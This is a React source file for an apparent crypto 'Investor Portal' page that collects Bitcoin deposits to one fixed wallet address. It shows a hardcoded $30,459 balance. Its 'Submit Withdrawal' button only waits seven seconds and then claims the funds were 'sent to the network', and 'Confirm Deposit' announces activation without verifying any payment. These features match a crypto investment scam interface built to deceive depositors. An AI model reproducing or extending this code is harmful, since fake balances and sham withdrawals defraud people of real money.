import { useSearchParams } from "react-router-dom";
import { useEffect, useMemo, useState } from "react";
import { QRCodeSVG } from "qrcode.react";
import { Bitcoin, Copy, Send, Upload, Check, Sparkles, Loader2, CheckCircle2 } from "lucide-react";
import { toast } from "sonner";
import { SiteHeader } from "@/components/SiteHeader";
import { RouteShell } from "@/components/RouteShell";
import { Stagger, StaggerItem } from "@/components/Stagger";
import { MagneticButton } from "@/components/MagneticButton";
import { BTC_WALLET, BTC_RATE_USD } from "@/lib/site-config";
import { useLocale, formatLocal } from "@/hooks/useLocale";
import { goldBurst } from "@/lib/confetti";
import { playTing, playTap } from "@/lib/sound";

const PRESETS = [40000, 20000, 10000, 5000, 3000];
const SUBS_KEY = "ec_subscribed_plans";

export default function Portal() {
  const [searchParams] = useSearchParams();
  const amount = searchParams.get("amount");
  const plan = searchParams.get("plan");

  const loc = useLocale();

  const [mode, setMode] = useState<"USD" | "BTC">("USD");
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [walletAddr, setWalletAddr] = useState("");

  const [isWithdrawing, setIsWithdrawing] = useState(false);
  const [withdrawSuccess, setWithdrawSuccess] = useState(false);

  const [depositAmount, setDepositAmount] = useState<string>(amount ? String(amount) : "5000");
  const [copied, setCopied] = useState(false);
  const [confirmed, setConfirmed] = useState(false);

  useEffect(() => {
    if (amount) setDepositAmount(String(amount));
  }, [amount]);

  const handleConfirm = (e: React.MouseEvent<HTMLButtonElement>) => {
    if (plan && typeof window !== "undefined") {
      const list: string[] = JSON.parse(localStorage.getItem(SUBS_KEY) || "[]");
      if (!list.includes(plan)) {
        list.push(plan);
        localStorage.setItem(SUBS_KEY, JSON.stringify(list));
      }
    }
    setConfirmed(true);

    const r = e.currentTarget.getBoundingClientRect();
    goldBurst({
      x: (r.left + r.width / 2) / window.innerWidth,
      y: (r.top + r.height / 2) / window.innerHeight,
    });
    playTing();
    toast.success("Deposit confirmed. Activating your tier.", {
      duration: 2200,
    });

    setTimeout(() => setConfirmed(false), 2500);
  };

  const handleWithdraw = () => {
    if (!withdrawAmount || !walletAddr) return;

    setIsWithdrawing(true);
    setWithdrawSuccess(false);
    playTap();

    setTimeout(() => {
      setIsWithdrawing(false);
      setWithdrawSuccess(true);
      playTing();
      toast.success("Withdrawal sent to the network.", { duration: 2400 });

      setWithdrawAmount("");
      setWalletAddr("");

      setTimeout(() => setWithdrawSuccess(false), 5000);
    }, 7000);
  };

  const btcEquivalent = useMemo(() => {
    const n = parseFloat(depositAmount || "0");
    if (!n) return "0.000000";
    return (n / BTC_RATE_USD).toFixed(6);
  }, [depositAmount]);

  const copy = async () => {
    await navigator.clipboard.writeText(BTC_WALLET);
    setCopied(true);
    playTap();
    toast.success("Address copied to clipboard.", { duration: 1600 });
    setTimeout(() => setCopied(false), 1800);
  };

  const depositNum = parseFloat(depositAmount || "0") || 0;

  return (
    <RouteShell>
      <div className="min-h-screen pb-28">
        <SiteHeader showUser={false} />
        <main className="mx-auto max-w-2xl space-y-6 px-5 py-6">
          <Stagger className="space-y-6">
            <StaggerItem>
              <header>
                <h1 className="font-display text-4xl">
                  Investor <em className="not-italic text-gradient-gold">Portal</em>
                </h1>
                <p className="mt-1 text-sm text-muted-foreground">
                  Deposit crypto to activate packages.
                </p>
              </header>
            </StaggerItem>

            {plan && (
              <StaggerItem>
                <div className="card-luxury flex items-center gap-3 border-primary/40 p-4">
                  <span className="grid h-9 w-9 place-items-center rounded-full bg-primary/15">
                    <Sparkles className="h-4 w-4 text-primary" />
                  </span>
                  <div className="flex-1">
                    <p className="text-xs uppercase tracking-wider text-muted-foreground">
                      Activating
                    </p>
                    <p className="font-display text-lg text-primary">{plan}</p>
                  </div>
                  <p className="font-display text-xl text-primary">
                    ${Number(amount || 0).toLocaleString()}
                  </p>
                </div>
              </StaggerItem>
            )}

            <StaggerItem>
              <section className="card-luxury p-5">
                <div className="flex items-center gap-2 text-sm text-muted-foreground">
                  <Upload className="h-4 w-4 text-primary" /> Withdraw Funds
                </div>

                <div className="mt-4 grid grid-cols-2 gap-2 rounded-2xl border border-border bg-surface p-1">
                  {(["USD", "BTC"] as const).map((m) => (
                    <button
                      key={m}
                      onClick={() => {
                        setMode(m);
                        playTap();
                      }}
                      className={`rounded-xl px-4 py-2.5 text-sm font-medium transition-all ${
                        mode === m
                          ? "bg-primary/15 text-primary ring-1 ring-primary/40"
                          : "text-muted-foreground"
                      }`}
                    >
                      {m} Amount
                    </button>
                  ))}
                </div>

                <div className="mt-4 flex items-center justify-between rounded-2xl border border-border bg-surface-elevated/60 p-4">
                  <div>
                    <p className="text-base">Available Balance</p>
                    <p className="font-display text-3xl text-primary">$30,459</p>
                    <p className="text-[11px] uppercase tracking-wider text-muted-foreground/70">
                      Local: {formatLocal(30459, loc)}
                    </p>
                  </div>
                  <button
                    onClick={() => {
                      setWithdrawAmount("30459");
                      playTap();
                    }}
                    className="rounded-xl border border-border px-4 py-2 text-sm text-primary"
                  >
                    MAX
                  </button>
                </div>

                <label className="mt-3 flex items-center gap-3 rounded-2xl border border-border bg-surface-elevated/60 px-4 py-3.5">
                  <span className="text-muted-foreground">$</span>
                  <input
                    value={withdrawAmount}
                    onChange={(e) => setWithdrawAmount(e.target.value)}
                    inputMode="decimal"
                    placeholder="Enter amount"
                    disabled={isWithdrawing}
                    className="flex-1 bg-transparent text-sm outline-none placeholder:text-muted-foreground disabled:opacity-50"
                  />
                </label>

                <label className="mt-3 flex items-center gap-3 rounded-2xl border border-border bg-surface-elevated/60 px-4 py-3.5">
                  <span className="grid h-6 w-6 place-items-center rounded-full bg-white">
                    <Bitcoin className="h-4 w-4 text-[#f7931a]" />
                  </span>
                  <input
                    value={walletAddr}
                    onChange={(e) => setWalletAddr(e.target.value)}
                    placeholder="Bitcoin wallet address"
                    disabled={isWithdrawing}
                    className="flex-1 bg-transparent text-sm outline-none placeholder:text-muted-foreground disabled:opacity-50"
                  />
                </label>

                {withdrawSuccess && (
                  <div className="mt-4 flex items-center gap-3 rounded-xl border border-green-500/30 bg-green-500/10 p-3 text-sm text-green-500">
                    <CheckCircle2 className="h-5 w-5 flex-shrink-0" />
                    <div>
                      <p className="font-medium">Withdrawal Initiated</p>
                      <p className="text-xs opacity-80">
                        Your request has been processed and sent to the network.
                      </p>
                    </div>
                  </div>
                )}

                <MagneticButton
                  onClick={handleWithdraw}
                  disabled={isWithdrawing || !withdrawAmount || !walletAddr}
                  className="btn-gold mt-4 flex w-full items-center justify-center gap-2 rounded-full py-3.5 text-sm disabled:cursor-not-allowed disabled:opacity-70"
                >
                  {isWithdrawing ? (
                    <>
                      <Loader2 className="h-4 w-4 animate-spin" /> Processing
                    </>
                  ) : (
                    <>
                      <Send className="h-4 w-4" /> Submit Withdrawal
                    </>
                  )}
                </MagneticButton>
              </section>
            </StaggerItem>

            <StaggerItem>
              <section className="card-luxury p-5">
                <div className="flex items-center gap-2 text-sm text-muted-foreground">
                  <span className="grid h-5 w-5 place-items-center rounded-full bg-white">
                    <Bitcoin className="h-3.5 w-3.5 text-[#f7931a]" />
                  </span>
                  Deposit Crypto
                </div>

                <div className="mt-5 rounded-2xl border border-border bg-surface-elevated/40 p-5">
                  <div className="relative mx-auto w-fit rounded-xl bg-white p-3">
                    <QRCodeSVG value={BTC_WALLET} size={200} level="H" />
                    <div className="pointer-events-none absolute inset-0 overflow-hidden rounded-xl">
                      <div className="shimmer h-full w-full" />
                    </div>
                  </div>

                  <div className="flex flex-col items-center gap-2 mt-5">
                    <span className="break-all text-center font-mono text-xs text-muted-foreground max-w-xs">
                      {BTC_WALLET}
                    </span>
                  </div>

                  <div className="mt-3 flex justify-center">
                    <button
                      onClick={copy}
                      className="inline-flex items-center gap-2 rounded-full border border-primary/40 bg-primary/10 px-4 py-2 text-xs text-primary"
                    >
                      {copied ? (
                        <Check className="h-3.5 w-3.5" />
                      ) : (
                        <Copy className="h-3.5 w-3.5" />
                      )}
                      {copied ? "Copied" : "Copy Address"}
                    </button>
                  </div>
                </div>

                <label className="mt-5 flex items-center gap-3 rounded-2xl border border-border bg-surface-elevated/60 px-4 py-3.5">
                  <span className="text-muted-foreground">$</span>
                  <input
                    value={depositAmount}
                    onChange={(e) => setDepositAmount(e.target.value)}
                    inputMode="decimal"
                    className="flex-1 bg-transparent text-base outline-none"
                  />
                </label>

                <p className="mt-2 text-[11px] uppercase tracking-wider text-muted-foreground/70">
                  Local: {formatLocal(depositNum, loc)}
                </p>

                <div className="mt-3 grid grid-cols-3 gap-2">
                  {PRESETS.map((v) => (
                    <button
                      key={v}
                      onClick={() => {
                        setDepositAmount(String(v));
                        playTap();
                      }}
                      className="rounded-xl border border-border bg-surface-elevated/40 py-2.5 text-sm text-muted-foreground transition-colors hover:border-primary/50 hover:text-primary"
                    >
                      ${v.toLocaleString()}
                    </button>
                  ))}
                </div>

                <p className="mt-3 text-xs text-muted-foreground">
                  ≈ {btcEquivalent} BTC at current rate
                </p>

                <MagneticButton
                  onClick={handleConfirm}
                  className="btn-gold mt-4 flex w-full items-center justify-center gap-2 rounded-full py-3.5 text-sm"
                >
                  {confirmed ? (
                    <>
                      <Check className="h-4 w-4" /> Confirmed. Activating
                    </>
                  ) : (
                    <>
                      <Send className="h-4 w-4" /> Confirm Deposit
                    </>
                  )}
                </MagneticButton>
              </section>
            </StaggerItem>
          </Stagger>
        </main>
      </div>
    </RouteShell>
  );
}
